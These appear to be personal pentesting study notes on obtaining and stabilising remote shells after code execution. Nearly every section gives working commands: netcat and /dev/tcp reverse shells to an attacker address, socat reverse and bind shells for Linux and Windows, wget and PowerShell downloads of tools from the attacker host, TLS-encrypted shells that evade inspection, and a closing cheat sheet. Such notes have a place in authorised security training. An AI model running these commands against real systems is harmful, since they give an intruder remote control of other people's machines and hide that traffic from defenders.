# Shells — Pentesting Notes

## 1. What is a Shell?

A **shell** is a command-line interface used to interact with an operating system.

In pentesting, after getting **RCE**, the goal is often to turn it into a **remote shell** so you can execute commands interactively.
### Common problem
Initial shells are often **unstable/non-interactive**:
- No tab completion
- No command history
- `Ctrl+C` may kill the shell
- `su` / `ssh` may not work correctly
- No proper job control
- No TTY

---

# 2. Reverse Shell

### Concept

**Attacker listens → Target connects back**
```text
Target ───────────► Attacker
       connection
```

Usually preferred because **outbound traffic is more commonly allowed** than inbound traffic.

### Attacker
```bash
nc -lvnp 4444
```

**Flags:**
- `-l` → listen
- `-v` → verbose
- `-n` → don't resolve DNS
- `-p` → listening port

### Target
```bash
nc ATTACKER_IP 4444 -e /bin/bash
```
`-e /bin/bash` tells Netcat to attach Bash to the connection.

> `-e` is not available in some Netcat versions, especially OpenBSD `nc`.

```bash
bash -c 'bash -i >& /dev/tcp/192.168.192.10/4444 0>&1'
```
if there is error with -e

---

# 3. Bind Shell

### Concept

**Target listens → Attacker connects**
```text
Attacker ─────────► Target
                   listening shell
```
Useful when the target can accept inbound connections but outbound connections are restricted.

### Target
```bash
nc -lvnp 8080 -e /bin/bash
```
### Attacker
```bash
nc TARGET_IP 8080
```

---

# 4. Reverse vs Bind Shell

| Reverse Shell                | Bind Shell                      |
| ---------------------------- | ------------------------------- |
| Target connects to attacker  | Attacker connects to target     |
| Usually more common          | Less common                     |
| Good when inbound is blocked | Good when outbound is blocked   |
| Works well behind NAT        | Requires accessible target port |

**Remember:**

> Reverse = target calls you  
> Bind = you call target

---

# 5. Netcat (`nc`)

Netcat is the basic tool for:
- Reverse shells
- Bind shells
- Port testing
- Simple file transfers
- Network connections
### Listener
```bash
nc -lvnp 4444
```

Useful flags:
```text
-l    listen
-v    verbose
-n    don't resolve DNS
-p    port
-u    UDP
-w    timeout
-q    quit after EOF
```

### Port choice

Common high ports:
```text
4444
8080
8443
```

Ports below `1024` usually require root privileges.

---

# 6. Netcat Variants

### Traditional `nc`
Simple and widely available.

### `ncat`
Part of Nmap and provides additional features such as:
- SSL/TLS
- Proxy support
- IPv6 improvements

Check:
```bash
ncat --help
```

---

# 7. `rlwrap`

### Problem

Raw Netcat shells don't provide good:
- Command history
- Arrow keys
- Line editing
### Solution
```bash
rlwrap nc -lvnp 4444
```

Think:
> `rlwrap` = makes Netcat easier to use.

Useful for longer shell sessions.

---

# 8. Socat

**Socat = more powerful Netcat**

Advantages:
- PTY allocation
- Better interactive shells
- Signal handling
- Job control
- SSL/TLS support

Basic syntax:
```bash
socat ADDRESS1 ADDRESS2
```

---

## Socat Reverse Shell

### Attacker
```bash
socat TCP-L:443 -
```
- `TCP-L:443` → listen on TCP port 443
- `-` → connect socket to stdin/stdout
### Target
```bash
socat TCP:ATTACKER_IP:443 EXEC:"bash -li"
```
- `TCP:IP:PORT` → connect to attacker
- `EXEC:` → execute command
- `bash -li` → interactive login Bash

---

## Socat Bind Shell

### Target
```bash
socat TCP-L:8088 EXEC:"bash -li"
```
### Attacker
```bash
socat TCP:TARGET_IP:8088 -
```

---

# 9. Windows Socat Shells

### Reverse PowerShell
```cmd
socat TCP:ATTACKER_IP:443 EXEC:powershell.exe,pipes
```

### Bind CMD
```cmd
socat TCP-L:8088 EXEC:cmd.exe,pipes
```

`pipes` handles Windows input/output correctly.

---

# 10. Shell Stabilisation — Python TTY

A raw shell isn't a proper terminal.

First check your terminal size **on attacker**:

```bash
stty size
```

Example:
```text
50 220
```

---

### Step 1 — Get shell

```bash
nc -lvnp 4444
```

Target:
```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

---

### Step 2 — Spawn TTY

On target:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This creates a pseudo-terminal.

---

### Step 3 — Set terminal

```bash
export TERM=xterm
```

---

### Step 4 — Fix local terminal

Press:
```text
Ctrl + Z
```

Then attacker:
```bash
stty raw -echo
```

Resume:
```bash
fg
```

---

### Step 5 — Set terminal dimensions

On target:
```bash
stty rows 50 cols 220
```

Use the values obtained from:
```bash
stty size
```

---

### If terminal becomes broken

```bash
stty sane
```

If necessary:
```bash
reset
```

### Memorise the flow
```text
nc shell (or socat) (i prefer using also rlwrap)
   ↓
python3 pty.spawn()
   ↓
export TERM=xterm
   ↓
Ctrl+Z
   ↓
stty raw -echo
   ↓
fg
   ↓
stty rows X cols Y
```

---

# 11. Fully Interactive Shell with Socat

Socat can provide a better PTY than the Python technique.

### Attacker
```bash
socat TCP-L:5555 FILE:`tty`,raw,echo=0
```
### Target
```bash
socat TCP:ATTACKER_IP:5555 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

Important options:
```text
pty     → allocate pseudo-terminal
stderr  → forward stderr
sigint  → Ctrl+C works
setsid  → proper session/job control
sane    → sane terminal settings
```

---

# 12. Transfer Socat to Target

If Socat isn't installed on the target:
We can make it with python or with scp
### Attacker

From the directory containing the binary:
```bash
python3 -m http.server 80
```

### Linux Target
```bash
wget http://ATTACKER_IP/socat -O /tmp/socat
```

Make executable:
```bash
chmod +x /tmp/socat
```

### Windows Target
```powershell
Invoke-WebRequest -Uri http://ATTACKER_IP/socat.exe -OutFile C:\Windows\Temp\socat.exe
```

---

# 13. Shell Encryption with Socat

Plaintext shells can be detected/inspected.

Socat supports **SSL/TLS** encryption.

### Generate certificate
```bash
openssl req -newkey rsa:2048 -nodes \
-keyout shell.key -x509 -days 365 -out shell.crt
```

Important:
```text
-newkey rsa:2048 → generate RSA key
-nodes            → don't encrypt private key with password
-x509             → self-signed certificate
-days 365         → certificate validity
```

Combine key + certificate:
```bash
cat shell.key shell.crt > shell.pem
```

---

# 14. Encrypted Reverse Shell

### Attacker
```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
```
### Target
```bash
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash
```
`verify=0` allows use of the self-signed certificate without certificate verification.

---

# 15. Encrypted Bind Shell

### Target

First obtain the certificate:
```bash
wget http://ATTACKER_IP/shell.pem -O /tmp/shell.pem
```

Then:
```bash
socat OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0 EXEC:"bash -li"
```

### Attacker
```bash
socat OPENSSL:TARGET_IP:8443,verify=0 -
```

---

# 16. Encrypted + Interactive TTY

For both **encryption + proper terminal**:

### Attacker
```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 \
FILE:`tty`,raw,echo=0
```

### Target
```bash
socat OPENSSL:ATTACKER_IP:443,verify=0 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

This gives:
```text
SSL/TLS
   +
PTY
   +
Signal handling
   +
Job control
   =
Stable encrypted shell
```

---

# 17. Windows Encrypted Shell

### Reverse PowerShell
```cmd
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:powershell.exe,pipes
```

### Encrypted Bind CMD
```cmd
socat OPENSSL-LISTEN:8443,cert=C:\Windows\Temp\shell.pem,verify=0 EXEC:cmd.exe,pipes
```

---

# 18. Msfvenom + Metasploit Handler

Use these when you need more advanced payload handling.

### Msfvenom
Used to generate payloads.

### Metasploit `multi/handler`

Used to receive/manage sessions.
Advantages:
- Multiple payload formats
- Staged payloads
- Meterpreter
- Session management
- Cross-platform support

Typical workflow:
```text
msfvenom
   ↓
Payload
   ↓
Target execution
   ↓
multi/handler
   ↓
Session
```

---

# 19. Tool Selection

### Quick shell

```bash
nc -lvnp 4444
```
**Use:** Fast initial access.

### Better Netcat shell

```bash
rlwrap nc -lvnp 4444
```
**Use:** History + arrow keys.

### Stable shell

```bash
socat ...
```
**Use:** PTY, job control, signals.

### Advanced payloads

```text
msfvenom + multi/handler
```

**Use:** Meterpreter, staged payloads, complex engagements.

---

# 20. Troubleshooting Checklist

### Check Socat features

```bash
socat -V
```
Look for OpenSSL support.

### Check certificate

```bash
ls -l shell.pem
```
Use an absolute path if necessary:

```bash
/tmp/shell.pem
```

### SSL verification errors

For a self-signed certificate, both sides should use:
```bash
verify=0
```

### Shell has no TTY

Try:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:
```bash
export TERM=xterm
```

### Broken local terminal
```bash
stty sane
```

---

#  Must-Remember Cheat Sheet

```text
REVERSE
Attacker:
nc -lvnp 4444

Target:
nc ATTACKER_IP 4444 -e /bin/bash
```

```text
BIND
Target:
nc -lvnp 8080 -e /bin/bash

Attacker:
nc TARGET_IP 8080
```

```text
RLWRAP
rlwrap nc -lvnp 4444
```

```text
PYTHON TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

Ctrl+Z
stty raw -echo
fg

stty rows X cols Y
```

```text
SOCAT TTY
Attacker:
socat TCP-L:5555 FILE:`tty`,raw,echo=0

Target:
socat TCP:ATTACKER_IP:5555 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

```text
SSL
openssl req -newkey rsa:2048 -nodes \
-keyout shell.key -x509 -days 365 -out shell.crt

cat shell.key shell.crt > shell.pem
```

```text
ENCRYPTED REVERSE
Attacker:
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -

Target:
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash
```

### The overall attack flow
```text
RCE
 ↓
Initial Shell
 ↓
Reverse / Bind Shell
 ↓
Stabilise TTY
 ↓
Enumerate
 ↓
Privilege Escalation
 ↓
Post-Exploitation
```

**The key idea:** don't confuse **RCE** with having a good shell. RCE executes code; a **shell gives you an interactive way to control the target**, and shell stabilization makes that access practical.